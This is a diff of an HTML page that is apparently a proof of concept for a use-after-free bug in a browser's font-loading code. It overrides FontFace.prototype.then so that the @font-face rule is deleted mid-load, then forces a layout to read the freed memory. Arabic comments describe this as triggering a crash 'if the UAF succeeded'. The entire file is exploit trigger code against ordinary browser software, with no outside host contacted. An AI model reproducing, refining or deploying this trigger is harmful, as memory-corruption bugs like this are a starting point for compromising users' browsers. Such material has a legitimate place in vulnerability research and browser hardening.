@@ -1,37 +1,38 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html>
 <head>
     <style id="s">
         @font-face { font-family: x; src: url(nonexistent-font.woff); }
     </style>
 </head>
 <body>
-<script>
-window.onload = () => {
-    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(A);
-    
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            // حذف القاعدة فوراً
-            document.getElementById('s').sheet.deleteRule(0);
+    <div id="status">Loading...</div>
+    <script>
+        window.onload = () => {
+            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+            document.fonts.add(A);
             
-            // "إجبار" النظام على محاولة إعادة المعالجة دون spray
-            // هذا يجعل المتصفح يقرأ من منطقة تم تحريرها للتو
-            return undefined;
-        }
-    });
+            Object.defineProperty(FontFace.prototype, 'then', {
+                configurable: true,
+                get() {
+                    // حذف القاعدة لإحداث الفجوة في الذاكرة
+                    document.getElementById('s').sheet.deleteRule(0);
+                    document.getElementById('status').innerHTML = "Rule deleted, triggering crash...";
+                    return undefined;
+                }
+            });
 
-    document.fonts.load('1em x', 'AB').catch(() => {});
-};
+            document.fonts.load('1em x', 'AB').catch(() => {});
 
-// إجبار المتصفح على إعادة رسم الصفحة
-window.requestAnimationFrame(() => {
-    document.body.style.display = 'none';
-    document.body.offsetHeight; // Force Layout
-    document.body.style.display = 'block';
-});
-
-</script>
+            // المحفز النهائي: إجبار المتصفح على قراءة الذاكرة المفسدة
+            setTimeout(() => {
+                const div = document.createElement('div');
+                div.style.font = '1em x';
+                document.body.appendChild(div);
+                // هذا السطر هو الذي سيجبر المتصفح على الانهيار إذا كان الـ UAF ناجحاً
+                document.body.offsetHeight; 
+            }, 1000);
+        };
+    </script>
 </body>
 </html>
